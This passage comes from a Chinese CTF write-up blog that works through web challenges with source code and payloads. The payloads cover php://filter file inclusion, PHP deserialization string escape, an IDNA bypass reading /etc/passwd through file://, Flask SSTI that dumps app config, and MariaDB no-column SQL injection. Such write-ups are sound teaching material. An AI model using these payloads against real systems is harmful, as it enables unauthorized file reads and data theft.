class="keyword">isset</span>(<span class="variable">$file</span>))</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">if</span>( strpos( <span class="variable">$file</span>, <span class="string">&quot;woofers&quot;</span> ) !==  <span class="literal">false</span> || strpos( <span class="variable">$file</span>, <span class="string">&quot;meowers&quot;</span> ) !==  <span class="literal">false</span> || strpos( <span class="variable">$file</span>, <span class="string">&quot;index&quot;</span>))&#123;</span><br><span class="line"><span class="keyword">include</span> (<span class="variable">$file</span> . <span class="string">&#x27;.php&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;Sorry, we currently only support woofers and meowers.&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>这里只允许传入woofers、meowers、index，我们需要想办法读取flag。<em><strong>我们这里利用php://filter伪协议可以套一层协议读取flag。</strong></em></p><p>构造payload：</p><p><code>?category=php://filter/read=convert.base64-encode/index/resource=flag</code></p><h3 id="安洵杯-2019-easy-serialize-php"><a href="#安洵杯-2019-easy-serialize-php" class="headerlink" title="[安洵杯 2019]easy_serialize_php"></a>[安洵杯 2019]easy_serialize_php</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="variable">$function</span> = @<span class="variable">$_GET</span>[<span class="string">&#x27;f&#x27;</span>];</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">filter</span>(<span class="params"><span class="variable">$img</span></span>)</span>&#123;</span><br><span class="line">    <span class="variable">$filter_arr</span> = <span class="keyword">array</span>(<span class="string">&#x27;php&#x27;</span>,<span class="string">&#x27;flag&#x27;</span>,<span class="string">&#x27;php5&#x27;</span>,<span class="string">&#x27;php4&#x27;</span>,<span class="string">&#x27;fl1g&#x27;</span>);</span><br><span class="line">    <span class="variable">$filter</span> = <span class="string">&#x27;/&#x27;</span>.implode(<span class="string">&#x27;|&#x27;</span>,<span class="variable">$filter_arr</span>).<span class="string">&#x27;/i&#x27;</span>;</span><br><span class="line">    <span class="keyword">return</span> preg_replace(<span class="variable">$filter</span>,<span class="string">&#x27;&#x27;</span>,<span class="variable">$img</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$_SESSION</span>)&#123;</span><br><span class="line">    <span class="keyword">unset</span>(<span class="variable">$_SESSION</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$_SESSION</span>[<span class="string">&quot;user&quot;</span>] = <span class="string">&#x27;guest&#x27;</span>;</span><br><span class="line"><span class="variable">$_SESSION</span>[<span class="string">&#x27;function&#x27;</span>] = <span class="variable">$function</span>;</span><br><span class="line"></span><br><span class="line">extract(<span class="variable">$_POST</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(!<span class="variable">$function</span>)&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;&lt;a href=&quot;index.php?f=highlight_file&quot;&gt;source_code&lt;/a&gt;&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(!<span class="variable">$_GET</span>[<span class="string">&#x27;img_path&#x27;</span>])&#123;</span><br><span class="line">    <span class="variable">$_SESSION</span>[<span class="string">&#x27;img&#x27;</span>] = base64_encode(<span class="string">&#x27;guest_img.png&#x27;</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="variable">$_SESSION</span>[<span class="string">&#x27;img&#x27;</span>] = sha1(base64_encode(<span class="variable">$_GET</span>[<span class="string">&#x27;img_path&#x27;</span>]));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$serialize_info</span> = filter(serialize(<span class="variable">$_SESSION</span>));</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$function</span> == <span class="string">&#x27;highlight_file&#x27;</span>)&#123;</span><br><span class="line">    highlight_file(<span class="string">&#x27;index.php&#x27;</span>);</span><br><span class="line">&#125;<span class="keyword">else</span> <span class="keyword">if</span>(<span class="variable">$function</span> == <span class="string">&#x27;phpinfo&#x27;</span>)&#123;</span><br><span class="line">    <span class="keyword">eval</span>(<span class="string">&#x27;phpinfo();&#x27;</span>); <span class="comment">//maybe you can find something in here!</span></span><br><span class="line">&#125;<span class="keyword">else</span> <span class="keyword">if</span>(<span class="variable">$function</span> == <span class="string">&#x27;show_image&#x27;</span>)&#123;</span><br><span class="line">    <span class="variable">$userinfo</span> = unserialize(<span class="variable">$serialize_info</span>);</span><br><span class="line">    <span class="keyword">echo</span> file_get_contents(base64_decode(<span class="variable">$userinfo</span>[<span class="string">&#x27;img&#x27;</span>]));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><em><strong>首先看看函数extract，</strong></em></p><p><em><strong>extract函数：将变量从数组中导入当前的符号表，这里就是把post数组里的取出来变成php变量，就比如我们post传<code>_seesion=123</code>,那它经过这个函数就变成了<code>$_session=123</code>,多了一个$符，而且它默认在变量名冲突的时候进行覆盖，这就导致了变量覆盖漏洞。</strong></em></p><p><em><strong>还有一个过滤的函数，正则匹配把传入的参数中含有的关键词替换为空。</strong></em></p><p><em><strong><code>$_SESSION</code>变量经过filter函数处理过，想通过控制img_path行不通，有一个函数shal()，这里可控的参数为<code>$_SESSION[user]和$_SESSION[function]</code></strong></em></p><p><em><strong>上面是大概了解一下源码，然后我们看看提示phpinfo里面有东西，去找一下，搜索一下关键词查找fopen、disable_、root。</strong></em></p><p><em><strong>盲打莽撞找到文件名。</strong></em></p><p><img src="buu2/33.png"></p><p>关键点就在这个过滤函数机制，不大会，看一下wp。</p><p>过滤函数分为：</p><p><strong>第一种为关键词数增加</strong></p><p><strong>第二种为关键词数减少</strong></p><p><em><strong>本体属于关键词减少，替换为空了。</strong></em></p><p><em><strong>一般通过键逃逸和值逃逸来解决。</strong></em></p><p><em><strong>值逃逸：这儿需要两个连续的键值对，由第一个的值覆盖第二个的键，这样第二个值就逃逸出去，单独作为一个键值对。</strong></em></p><p><em><strong>构造payload：</strong></em></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$_SESSION</span>[<span class="string">&#x27;user&#x27;</span>]=<span class="string">&quot;flagflagflagphpflagflag&quot;</span>;</span><br><span class="line"><span class="variable">$_SESSION</span>[<span class="string">&#x27;function&#x27;</span>] = <span class="string">&#x27;&quot;;s:3:&quot;img&quot;;s:20:&quot;ZDBnM19mMWFnLnBocA==&quot;;&#125;&#x27;</span>;</span><br><span class="line"><span class="variable">$_SESSION</span>[<span class="string">&#x27;img&#x27;</span>] = base64_encode(<span class="string">&#x27;guest_img.png&#x27;</span>);</span><br><span class="line"><span class="keyword">echo</span> serialize(<span class="variable">$_SESSION</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p><em><strong>得到</strong></em></p><p><em><strong><code>a:3:&#123;s:4:&quot;user&quot;;s:23:&quot;flagflagflagphpflagflag&quot;;s:8:&quot;function&quot;;s:41:&quot;&quot;;s:3:&quot;img&quot;;s:20:&quot;ZDBnM19mMWFnLnBocA==&quot;;&#125;&quot;;s:3:&quot;img&quot;;s:20:&quot;Z3Vlc3RfaW1nLnBuZw==&quot;;&#125;</code></strong></em></p><p><em><strong>之前的filter函数将php flag啥的都替换为空，那么我们就可以使$_SESSION[user]=”“中字符串的长度等于”;s:8:“function”;s:41:”一共23位。经过反序列化后少了一个键值，我们要重新加一个键值。</strong></em></p><p><em><strong>最后的payload：</strong></em></p><p><em><strong><code>_SESSION[user]=flagflagflagphpflagflag&amp;_SESSION[function] =&quot;;s:3:&quot;img&quot;;s:20:&quot;ZDBnM19mMWFnLnBocA==&quot;;s:1:&quot;a&quot;;s:1:&quot;a&quot;;&#125;</code></strong></em></p><p><em><strong>参考<a href="https://www.freesion.com/article/2168622316/">https://www.freesion.com/article/2168622316/</a></strong></em></p><p><em><strong>还有一种方法也学习一下，加深自己的理解：</strong></em></p><p><em><strong>值逃逸：这儿只需要一个键值对就行了，我们直接构造会被过滤的键，这样值的一部分充当键，剩下得一部分作为单独的键值对，</strong></em></p><p><em><strong>构造payload：</strong></em></p><p><em><strong><code>_SESSION[phpflag]=;s:14:&quot;phpflagphpflag&quot;;s:7:&quot;xxxxxxx&quot;;s:3:&quot;img&quot;;s:20:&quot;L2QwZzNfZmxsbGxsbGFn&quot;;&#125;</code></strong></em></p><p><em><strong>通过键值img成为键名，传入参数img读取文件内容。</strong></em></p><h3 id="SUCTF-2019-Pythonginx"><a href="#SUCTF-2019-Pythonginx" class="headerlink" title="[SUCTF 2019]Pythonginx"></a>[SUCTF 2019]Pythonginx</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">URL:</span><br><span class="line"><span class="meta">    @app.route(<span class="params"><span class="string">&#x27;/getUrl&#x27;</span>, methods = [<span class="string">&#x27;GET&#x27;</span>, <span class="string">&#x27;POST&#x27;</span>]</span>) </span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">getUrl</span>():</span></span><br><span class="line">    url = request.args.get(<span class="string">&quot;url&quot;</span>) </span><br><span class="line">    host = parse.urlparse(url).hostname</span><br><span class="line"><span class="keyword">if</span> host == <span class="string">&#x27;suctf.cc&#x27;</span>: <span class="keyword">return</span> <span class="string">&quot;我扌 your problem? 111&quot;</span></span><br><span class="line">parts = <span class="built_in">list</span>(urlsplit(url)) </span><br><span class="line">host = parts[<span class="number">1</span>]</span><br><span class="line"><span class="keyword">if</span> host == <span class="string">&#x27;suctf.cc&#x27;</span>: <span class="keyword">return</span> <span class="string">&quot;我扌 your problem? 222 &quot;</span> + host newhost = []</span><br><span class="line"><span class="keyword">for</span> h <span class="keyword">in</span> host.split(<span class="string">&#x27;.&#x27;</span>): newhost.append(h.encode(<span class="string">&#x27;idna&#x27;</span>).decode(<span class="string">&#x27;utf-8&#x27;</span>)) parts[<span class="number">1</span>] = <span class="string">&#x27;.&#x27;</span>.join(newhost)</span><br><span class="line">    <span class="comment"># 去掉url 中的空格 </span></span><br><span class="line">finalUrl =urlunsplit(parts).split(<span class="string">&#x27; &#x27;</span>)[<span class="number">0</span>] </span><br><span class="line">host = parse.urlparse(finalUrl).hostname</span><br><span class="line"><span class="keyword">if</span> host == <span class="string">&#x27;suctf.cc&#x27;</span>: <span class="keyword">return</span> urllib.request.urlopen(finalUrl).read()</span><br><span class="line"><span class="keyword">else</span> :<span class="keyword">return</span> <span class="string">&quot;我扌 your problem? 333&quot;</span></span><br></pre></td></tr></table></figure><p>好好审计一下源码，创建一个路由，这里区分一下两个方法：</p><p><strong>POST</strong>方法提交时要用<strong>request.form</strong>来获取,而用<strong>GET</strong>方法则用<strong>request.args</strong>来获取。</p><p>通过url传参，前两个判断 host 是否是 suctf.cc ，如果不是才能继续。然后第三个经过了 decode(‘utf-8’) 之后传进了 urlunsplit 函数，在第三个判断中又必须要等于 suctf.cc 才行。</p><p><strong>当URL 中出现一些特殊字符的时候，输出的结果可能不在预期</strong></p><p>根据源码构造脚本，输出可以逃逸的字符串：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> urllib.parse <span class="keyword">import</span> urlparse,urlunsplit,urlsplit</span><br><span class="line"><span class="keyword">from</span> urllib <span class="keyword">import</span> parse</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_unicode</span>():</span></span><br><span class="line">    <span class="keyword">for</span> x <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">65536</span>):</span><br><span class="line">        uni=<span class="built_in">chr</span>(x)</span><br><span class="line">        url=<span class="string">&quot;http://suctf.c&#123;&#125;&quot;</span>.<span class="built_in">format</span>(uni)</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            <span class="keyword">if</span> getUrl(url):</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">&quot;str: &quot;</span>+uni+<span class="string">&#x27; unicode: \\u&#x27;</span>+<span class="built_in">str</span>(<span class="built_in">hex</span>(x))[<span class="number">2</span>:])</span><br><span class="line">        <span class="keyword">except</span>:</span><br><span class="line">            <span class="keyword">pass</span></span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">getUrl</span>(<span class="params">url</span>):</span></span><br><span class="line">    url=url</span><br><span class="line">    host=parse.urlparse(url).hostname</span><br><span class="line">    <span class="keyword">if</span> host == <span class="string">&#x27;suctf.cc&#x27;</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">    parts=<span class="built_in">list</span>(urlsplit(url))</span><br><span class="line">    host=parts[<span class="number">1</span>]</span><br><span class="line">    <span class="keyword">if</span> host == <span class="string">&#x27;suctf.cc&#x27;</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">    newhost=[]</span><br><span class="line">    <span class="keyword">for</span> h <span class="keyword">in</span> host.split(<span class="string">&#x27;.&#x27;</span>):</span><br><span class="line">        newhost.append(h.encode(<span class="string">&#x27;idna&#x27;</span>).decode(<span class="string">&#x27;utf-8&#x27;</span>))</span><br><span class="line">    parts[<span class="number">1</span>]=<span class="string">&#x27;.&#x27;</span>.join(newhost)</span><br><span class="line">    finalUrl=urlunsplit(parts).split(<span class="string">&#x27; &#x27;</span>)[<span class="number">0</span>]</span><br><span class="line">    host=parse.urlparse(finalUrl).hostname</span><br><span class="line">    <span class="keyword">if</span> host == <span class="string">&#x27;suctf.cc&#x27;</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line"><span class="keyword">if</span> __name__==<span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    get_unicode()</span><br></pre></td></tr></table></figure><p>选择其中一个字符串，代替一个c。</p><p>该符号经url编码得到：%E2%84%82</p><p>我们可以直接构造payload读取文件：</p><p><code>getUrl?url=file://suctf.c%E2%84%82/../../../../../etc/passwd</code></p><p><img src="buu2/34.png"></p><p>题目提示读取nginx的配置文件</p><p><code>getUrl?url=file://suctf.c%E2%84%82/../../../../../usr/local/nginx/conf/nginx.conf</code></p><p><img src="buu2/35.png"></p><p>直接读取flag了。</p><p><code>getUrl?url=file://suctf.c%E2%84%82/../../../../../usr/fffffflag</code></p><p><img src="buu2/36.png"></p><p>参考：<a href="https://www.cnblogs.com/Cl0ud/p/12187204.html">https://www.cnblogs.com/Cl0ud/p/12187204.html</a></p><p>贴上另外部分nginx的配置文件所在位置</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">配置文件存放目录：/etc/nginx</span><br><span class="line">主配置文件：/etc/nginx/conf/nginx.conf</span><br><span class="line">管理脚本：/usr/lib64/systemd/system/nginx.service</span><br><span class="line">模块：/usr/lisb64/nginx/modules</span><br><span class="line">应用程序：/usr/sbin/nginx</span><br><span class="line">程序默认存放位置：/usr/share/nginx/html</span><br><span class="line">日志默认存放位置：/var/log/nginx</span><br></pre></td></tr></table></figure><h3 id="0CTF-2016-piapiapia"><a href="#0CTF-2016-piapiapia" class="headerlink" title="[0CTF 2016]piapiapia"></a>[0CTF 2016]piapiapia</h3><p>先以用户名为admin，展开爆破，发现密码在两位数内会说密码错误，但是好像没啥用，也不存在sql注入，扫一下目录。</p><p>扫出<a href="http://www.zip,源码泄露./">www.zip，源码泄露。</a></p><p>好好看了一下源码，也知道了为什么之前登陆会这样了，就有点浪费时间去爆破了。</p><p>config.php里的flag是配置文件，实际的服务器环境中，这个flag是有值的。</p><p>在profile.php看到了关键函数file_get_contents这个用来读取文件的，同时还有反序列化。</p><p><img src="buu2/37.png"></p><p>然后看看update.php</p><p><img src="buu2/38.png"></p><p><em><strong>存在很多过滤，前两个正则分别判断是否为数字或字符串和第三个不一样，nickname判断是否字符串还多了长度是否超过10，这里可以通过数组绕过正则表达式。</strong></em></p><p><em><strong>代码后面update_profile处我们想到这个可能是将数据保存到数据库，而且还用了php序列化serialize()，我们可以试一下反序列化漏洞，最后把flag数据读取出来。</strong></em></p><p><em><strong>调用链顺序：update.php-&gt;update_profile()-&gt;class.php里的update()-&gt;数据库-&gt;class.php里的select()-&gt;show_profile()-&gt;profile.php里的file_get_contents()。</strong></em></p><p><em><strong>在后端中，反序列化是以”;}结束的，因此如果我们把”;}带入需要反序列化的字符串中（除了结尾处），就能让反序列化提前结束而后面的内容就会被丢弃。</strong></em></p><p>本题的原理和上上题目的原理类似：</p><p><em><strong>PHP反序列化中值的字符读取多少其实是由表示长度的数字控制的，而且只要整个字符串的前一部分能够成功反序列化，这个字符串后面剩下的一部分将会被丢弃.如果程序在对序列化之后的字符串进行过滤转义导致字符串内容变长/变短时，就会导致反序列化无法得到正常结果</strong></em></p><p>我们需要让这34字符”;}s:5:“photo”;s:10:“config.php”;}逃逸出来。</p><p>通过where过滤成hacker，会多一个长度。</p><p>相当于nickname的值把photo位置给抢占了，挤出去了</p><p>最后的payload：</p><p><code>wherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewhere&quot;;&#125;s:5:&quot;photo&quot;;s:10:&quot;config.php&quot;;&#125;</code></p><p>参考一下：<a href="https://www.baidu.com/link?url=K_BKXj_naHDrCrKTydDLe0f9c77rsmwZHGKdeepjPvD22TIHM_EOD2J_rgnDkqQmaBL4Wh4QNVIKU0EYCKo2__&amp;wd=&amp;eqid=8ac106c7002e910300000006607b857f">https://www.baidu.com/link?url=K_BKXj_naHDrCrKTydDLe0f9c77rsmwZHGKdeepjPvD22TIHM_EOD2J_rgnDkqQmaBL4Wh4QNVIKU0EYCKo2__&amp;wd=&amp;eqid=8ac106c7002e910300000006607b857f</a></p><p>操作过程：</p><p>首先到登陆页面register.php注册后登陆，输入相应信息，抓包修改nickname内容后发包，在</p><p><img src="buu2/39.png"></p><p>最后f12查看返回base64编码，解码得到flag。</p><p><img src="buu2/40.png"></p><p>这题和上上题就是同一个原理，只不过是本题多了一个数组绕过，再补充一些相关绕过：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">md5(Array()) = null</span><br><span class="line">sha1(Array()) = null</span><br><span class="line">ereg(pattern,Array()) =null</span><br><span class="line">preg_match(pattern,Array()) = false</span><br><span class="line">strcmp(Array(), “abc”) =null</span><br><span class="line">strpos(Array(),“abc”) = null</span><br><span class="line">strlen(Array()) = null</span><br></pre></td></tr></table></figure><p>很多时候序列化字符串逃逸都和filter相关。</p><h3 id="WesternCTF2018-shrine"><a href="#WesternCTF2018-shrine" class="headerlink" title="[WesternCTF2018]shrine"></a>[WesternCTF2018]shrine</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> flask</span><br><span class="line"><span class="keyword">import</span> os </span><br><span class="line">app = flask.Flask(__name__) </span><br><span class="line">app.config[<span class="string">&#x27;FLAG&#x27;</span>] = os.environ.pop(<span class="string">&#x27;FLAG&#x27;</span>)<span class="comment">#注册了一个名为FLAG的config，暗示了要通过通过查找config文件找到flag</span></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span></span>) </span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">index</span>():</span> <span class="keyword">return</span> <span class="built_in">open</span>(__file__).read()</span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/shrine/&#x27;</span></span>)</span><span class="comment"># 设置了shrine路由 </span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">shrine</span>(<span class="params">shrine</span>):</span> </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">safe_jinja</span>(<span class="params">s</span>):</span> </span><br><span class="line">      s =s.replace(<span class="string">&#x27;(&#x27;</span>, <span class="string">&#x27;&#x27;</span>).replace(<span class="string">&#x27;)&#x27;</span>, <span class="string">&#x27;&#x27;</span>)<span class="comment"># 过滤括号</span></span><br><span class="line">      blacklist = [<span class="string">&#x27;config&#x27;</span>,<span class="string">&#x27;self&#x27;</span> ]<span class="comment"># 黑名单</span></span><br><span class="line"><span class="keyword">return</span> <span class="string">&#x27;&#x27;</span>.join([<span class="string">&#x27;&#123;&#123;% set &#123;&#125;=None%&#125;&#125;&#x27;</span>.<span class="built_in">format</span>(c) <span class="keyword">for</span> c <span class="keyword">in</span> blacklist]) +s <span class="comment"># 把黑名单的东西遍历并设为空</span></span><br><span class="line"><span class="keyword">return</span> flask.render_template_string(safe_jinja(shrine)) <span class="comment"># 模块渲染</span></span><br><span class="line"><span class="keyword">if</span> __name__ ==<span class="string">&#x27;__main__&#x27;</span>: app.run(debug = <span class="literal">True</span>)</span><br></pre></td></tr></table></figure><p>很明显ssti注入，flask，jinja字符出现。本题过滤了括号，并且设置黑名单 [‘config’,’self’ ]，<strong>如果没有过滤可以直接即可查看所有app.config内容</strong></p><p>新学一个python函数url_for，作用是url是用于构建指定函数的URL，再配合globals()，该函数会以字典类型返回当前位置的全部全局变量。</p><p>payload:</p><p><code>&#123;&#123;url_for.__globals__&#125;&#125;</code></p><p><img src="buu2/41.png"></p><p>current_app’: &lt;Flask ‘app’&gt;这里的current就是指的当前的app，查看</p><p><code>&#123;&#123;url_for.__globals__['current_app'].config&#125;&#125;</code></p><p>查看到flag。</p><p><img src="buu2/42.png"></p><p>同样还有一个函数也可以实现，<strong>get_flashed_messages</strong></p><p><em><strong>返回之前在Flask中通过 flash() 传入的闪现信息列表。把字符串对象表示的消息加入到一个消息队列中，然后通过调用 get_flashed_messages() 方法取出(闪现信息只能取出一次，取出后闪现信息会被清空)。</strong></em></p><h3 id="SWPU2019-Web1"><a href="#SWPU2019-Web1" class="headerlink" title="[SWPU2019]Web1"></a>[SWPU2019]Web1</h3><p>类型：SQL注入。</p><p> <img src="buu2/44.png"></p><p>广告名内容加个单引号，报错，存在sql注入。</p><p>尝试union查询注入，发现空格被替换了。</p><p><img src="buu2/45.png"></p><p>尝试/**/注释符替换空格，可以成功绕过空格过滤，想通过order by查询字段数，但是被黑名单了。</p><p><img src="buu2/46.png"></p><p>我们可以通过这个方法来获得字段数，一直试，</p><p><img src="buu2/47.png"></p><p>一共有22个字段，可以慢慢试出来。</p><p>接着要查询爆数据库名为web1。想接着查表，结果存在黑名单。</p><p>information_schema被黑名单了，报错注入相关函数也被黑名单了，看一下相关wp</p><p>其实order by 被过滤了，可以使用group by来猜字段，通过联合查询来猜字段适用于字段数小的，字段数大的太麻烦。</p><p>学习一下遇到information_schema被黑名单，如何绕过。</p><p>通过语句：</p><p><code>select group_concat(table_name) from mysql.innodb_table_stats</code></p><p>这是在MYSQL一个分支，数据库管理系统MariaDB适用的方法。成功拿到表名。</p><p><img src="buu2/48.png"></p><p><strong>无列名注入</strong></p><p>参考<a href="https://www.jianshu.com/p/dc9af4ca2d06">https://www.jianshu.com/p/dc9af4ca2d06</a></p><p>可以通过数字来查询第几列的全部数据。</p><p>payload:</p><p><code>-1&#39;union/**/select/**/1, (select/**/group_concat(b)/**/from(select/**/1,2,3/**/as/**/b/**/union/**/select*from/**/users)x),3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22&#39; </code></p><p><strong>本题关键：无列名注入。</strong></p><h3 id="WUSTCTF2020-朴实无华"><a href="#WUSTCTF2020-朴实无华" class="headerlink" title="[WUSTCTF2020]朴实无华"></a>[WUSTCTF2020]朴实无华</h3><p>测试出来有robots.txt文件，存在文件fAke_f1agggg.php，访问一下，假的flag，结果响应头有密码。</p><p><img src="buu2/43.png"></p><p>访问/fl4g.php拿到源码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">header(<span class="string">&#x27;Content-type:text/html;charset=utf-8&#x27;</span>);</span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line">highlight_file(<span class="keyword">__file__</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">//level 1</span></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;num&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$num</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;num&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(intval(<span class="variable">$num</span>) &lt; <span class="number">2020</span> &amp;&amp; intval(<span class="variable">$num</span> + <span class="number">1</span>) &gt; <span class="number">2021</span>)&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;鎴戜笉缁忔剰闂寸湅浜嗙湅鎴戠殑鍔冲姏澹�, 涓嶆槸鎯崇湅鏃堕棿, 鍙槸鎯充笉缁忔剰闂�, 璁╀綘鐭ラ亾鎴戣繃寰楁瘮浣犲ソ.&lt;/br&gt;&quot;</span>;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;閲戦挶瑙ｅ喅涓嶄簡绌蜂汉鐨勬湰璐ㄩ棶棰�&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;鍘婚潪娲插惂&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//level 2</span></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;md5&#x27;</span>]))&#123;</span><br><span class="line">   <span class="variable">$md5</span>=<span 